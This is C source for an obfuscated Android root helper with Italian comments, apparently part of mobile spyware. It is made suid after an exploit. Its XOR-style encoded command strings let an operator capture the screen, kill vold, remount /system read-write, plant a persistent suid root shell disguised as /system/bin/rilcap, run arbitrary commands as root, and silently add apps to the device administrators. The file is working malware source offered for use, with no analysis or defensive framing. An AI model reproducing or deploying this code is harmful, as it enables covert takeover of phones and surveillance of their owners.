// questo file viene compilato come rdb e quando l'exploit funziona viene suiddato
// statuslog -c "/system/bin/cat /dev/graphics/fb0"
int main(int argc, char** argv) {
	unsigned char fb[] = "\x3b\x23\x1a\xa3\x5f"; // "fb"
	unsigned char fb0[] = "\xd3\x05\xc7\x04\xb9\xbe\xaf\x04\xbc\xa3\xb2\xad\xc5\xba\xb0\xa0\x04\xbf\xb3\xed"; // "/dev/graphics/fb0"
	unsigned char vol[] = "\x4e\xde\x93\xc8\x21\xde"; // "vol"
	unsigned char vold1[] = "\x0b\xda\xd5\x8d\xe4\x9b\x93"; // "vold"
	unsigned char vold2[] = "\xcc\x74\xbc\x5a\x63\x60\x68"; // "vold"
	unsigned char reb[] = "\x2c\x97\xb8\x62\x77\x72"; // "reb"
	unsigned char blr[] = "\xf4\x61\x96\x96\x98\x86"; // "blr"
	unsigned char blw[] = "\x50\x1e\x4d\x4e\x44\x5b"; // "blw"
	unsigned char rt[] = "\x04\x16\x10\x9a\x90"; // "rt"
	unsigned char system1[] = "\x63\xfa\x9e\xbc\xf0\xee\xf0\xeb\xfa\xf2"; // "/system"
	unsigned char system2[] = "\xa2\xf5\x50\x77\x33\x25\x33\x3e\x49\x31"; // "/system"
	unsigned char system3[] = "\xd9\x65\xbb\x3e\x6a\x60\x6a\x77\x44\x7c"; // "/system"
	unsigned char system4[] = "\xca\xa3\x6e\x2b\xff\xf5\xff\xc2\xf1\xe9"; // "/system"
	unsigned char mntsdcard[] = "\xa4\x98\x37\xbb\xf9\xfa\xf0\xbb\xf7\xc0\xc7\xc5\xf6\xc0"; // "/mnt/sdcard"
	unsigned char rilcap1[] = "\x35\x63\x44\x1e\xca\xcc\xca\xc7\xd0\xd8\x1e\xd9\xdc\xdd\x1e\xc9\xdc\xdf\xda\xd4\xcb"; // "/system/bin/rilcap"
	unsigned char rilcap2[] = "\x78\xd1\xbb\xf9\x0d\x03\x0d\x0c\x3f\x37\xf9\x3a\x33\x36\xf9\x0a\x33\x34\x3d\x3b\x08"; // "/system/bin/rilcap"
	unsigned char sd[] = "\x2d\xcf\xe0\xe2\xd7"; // "sd"
	unsigned char ru[] = "\x2c\xb1\x9f\xbe\xbb"; // "ru"
	unsigned char air[] = "\x9b\xc5\x5d\x7a\x72\x6b"; // "air"
	unsigned char qzx[] = "\x04\x52\x55\x95\x82\x9c"; // "qzx"
	unsigned char fhc[] = "\x68\x87\xec\x12\x00\x15"; // "fhc"
	unsigned char fho[] = "\xa0\x46\xe5\x4a\x48\x53"; // "fho"
	unsigned char pzm[] = "\x2d\x7a\x54\xad\xab\xc0"; // "pzm"
	unsigned char qzs[] = "\x17\xc1\xd5\xe6\xef\xe4"; // "qzs"
	unsigned char binsh1[] = "\xdf\x14\xc5\x10\xd4\xae\xd4\xab\xda\xd2\x10\xc5\xde\xd1\x10\xd4\xdf"; // "/system/bin/sh"
	unsigned char binsh2[] = "\x0b\xeb\xee\xe4\x88\xb6\x88\x81\xb2\xba\xe4\xbf\xa6\xbb\xe4\x88\xa5"; // "/system/bin/sh"
	unsigned char adm[] = "\x5b\x25\x7d\x7a\x41\x7e"; // "adm"
	unsigned char sh[] = "\x6a\xe2\x8a\x19\x06"; // "sh"
	unsigned char lid[] = "\xb2\xf9\x48\x2e\x2d\x36"; // "lid"
	unsigned char rf[] = "\xf9\x6f\x94\x95\x61"; // "rf"
	unsigned char fhs[] = "\xe5\xe3\x05\x85\x93\x9a"; // "fhs"
	unsigned char ape[] = "\xaa\xb4\x1d\xcb\x3a\x37"; // "ape"
	unsigned char srh[] = "\x05\xcb\xcd\x8a\x89\xf3"; // "srh"

	int i;
	unsigned char *da, *db;
	
	if (argc < 2) {
		LOG("Usage: ");
		LOG("%s", argv[0]);
		LOG(" <command>\n");
		LOG("fb - try to capture a screen snapshot\n");
		LOG("vol - kill VOLD twice\n");
		LOG("reb - reboot the phone\n");
		LOG("blr - mount /system in READ_ONLY\n");
		LOG("blw - mount /system in READ_WRITE\n");
		LOG("rt - install the root shell in /system/bin/rilcap\n");
		LOG("ru - remove the root shell from /system/bin/rilcap\n");
		LOG("rf <mntpoint> <file> - remove <file> from <mntpoint>");
		LOG("sd - mount /sdcard\n");
		LOG("air - check if the shell has root privileges\n");
		LOG("qzx \"command\" - execute the given commandline\n");
		LOG("fhc <src> <dest> - copy <src> to <dst>\n");
		LOG("fhs <mntpoint> <src> <dest> - copy <src> to <dst> on mountpoint <mntpoint>\n");
		LOG("fho <user> <group> <file> - chown <file> to <user>:<group>\n");
		LOG("pzm <newmode> <file> - chmod <file> to <newmode>\n");
		LOG("adm <package name/receiver>\n");
		LOG("qzs - start a root shell\n");
		LOG("lid <proc> <dest file> - return process id for <proc> write it to <dest file>\n");
		LOG("ape <content> <dest file> - append text <content> to <dest files> if not yet present\n");
		LOG("srh <content> <file> - search for <content> in <file>\n");
		
		return 0;
	}
	
	setgod();
	
	// Cattura uno screenshot
	if (strcmp(argv[1], deobfuscate(fb)) == 0 && argc == 3) {
		LOG("Capturing a screenshot\n");
		char* filename = argv[2];

		copy(deobfuscate(fb0), filename);
		chmod(filename, 0666);
	} else if (strcmp(argv[1], deobfuscate(vol)) == 0) { // Killa VOLD per due volte
		unsigned int pid;
		
		LOG("Killing VOLD\n");

		for (i = 0; i < 2; i++) {
			pid = getProcessId(deobfuscate(vold1));

			if (pid) {
				kill(getProcessId(deobfuscate(vold2)), SIGKILL);
				sleep(2);
			}	
		}
	} else if (strcmp(argv[1], deobfuscate(reb)) == 0) { // Reboot
		LOG("Rebooting...\n");

		sync_reboot();
	} else if (strcmp(argv[1], deobfuscate(blr)) == 0) { // Monta /system in READ_ONLY
		LOG("Mounting FS read only\n");
		remount(deobfuscate(system1), MS_RDONLY);
	} else if (strcmp(argv[1], deobfuscate(blw)) == 0) { // Monta /system in READ_WRITE
		LOG("Mounting FS read write\n");
		remount(deobfuscate(system2), 0);
	} else if (strcmp(argv[1], deobfuscate(rt)) == 0) {  // Copia la shell root in /system/bin/rilcap
		LOG("Installing suid shell\n");
		copy_root(deobfuscate(system3), deobfuscate(rilcap1));
	} else if (strcmp(argv[1], deobfuscate(ru)) == 0) {  // Cancella la shell root in /system/bin/rilcap
		LOG("Removing suid shell\n");
		delete_root(deobfuscate(system4), deobfuscate(rilcap2));
	} else if (strcmp(argv[1], deobfuscate(rf)) == 0) {  // Cancella un file dal filesystem
		LOG("Removing %s from %s\n", argv[3], argv[2]);
		delete_root(argv[2], argv[3]);
	} else if (strcmp(argv[1], deobfuscate(sd)) == 0) {  // Mount /sdcard
		LOG("Mounting /sdcard\n");
		my_mount(deobfuscate(mntsdcard));
	} else if (strcmp(argv[1], deobfuscate(air)) == 0) { // Am I Root?
		LOG("Are we root?\n");
		return setgod();
	} else if (strcmp(argv[1], deobfuscate(qzx)) == 0) { // Eseguiamo la riga passataci
		LOG("Executing \"%s\"\n", argv[2]);
		return system(argv[2]);
	} else if (strcmp(argv[1], deobfuscate(fhc)) == 0) { // Copiamo un file nel path specificato dal secondo argomento 
		LOG("Copying file %s to %s\n", argv[2], argv[3]);
		copy(argv[2], argv[3]);
		return 0;
	} else if (strcmp(argv[1], deobfuscate(fhs)) == 0) { // Copiamo un file nel path specificato dal secondo argomento (con remount del mntpoint)
		LOG("Copying file %s to %s on mountpoint %s\n", argv[3], argv[4], argv[2]);
		copy_remount(argv[2], argv[3], argv[4]);
		return 0;
	} else if (strcmp(argv[1], deobfuscate(fho)) == 0) { // chown: user group file
		LOG("Chowning to %s:%s file %s\n", argv[2], argv[3], argv[4]);
		my_chown(argv[2], argv[3], argv[4]);
		return 0;
	} else if (strcmp(argv[1], deobfuscate(pzm)) == 0) { // chmod: newmode file
		LOG("Chmodding to %s file %s\n", argv[2], argv[3]);
		my_chmod(argv[2], argv[3]);
		return 0;
	} else if (strcmp(argv[1], deobfuscate(adm)) == 0) { // Add the application to the admin list
		LOG("Adding the app %s to Administrators list\n", argv[2]);
		add_admin(argv[2]);
		return 0;
	} else if (strcmp(argv[1], deobfuscate(lid)) == 0) { // Write pid of a process to file
		LOG("Returning process ID for %s to %s\n", argv[2], argv[3]);
		i = getProcessId(argv[2]);

		LOG("Process id is: %d\n", i);
		log_to_file(argv[3], (char *)&i, sizeof(int));
		return 0;
	} else if (strcmp(argv[1], deobfuscate(ape)) == 0) { // Append text content to file, add newline
		LOG("Appending %s to %s\n", argv[2], argv[3]);
		return append_content(argv[2], argv[3]);
	} else if (strcmp(argv[1], deobfuscate(srh)) == 0) { // Search for content in file return 1 if content is present 0 if not, -1 in case of error
		LOG("Searching for %s in %s\n", argv[2], argv[3]);
		return search_content(argv[2], argv[3]);
	} else if (strcmp(argv[1], deobfuscate(qzs)) == 0) { // Eseguiamo una root shell
		const char * shell = deobfuscate(binsh1);
		LOG("Starting root shell\n");

		int i;
		char *exec_args[argc + 1];
		exec_args[argc] = NULL;
		exec_args[0] = deobfuscate(sh);

		for (i = 1; i < argc; i++) {
			exec_args[i] = argv[i];
		}

		execv(deobfuscate(binsh2), exec_args);

		LOG("Exiting shell\n");
	}

	return 0;
}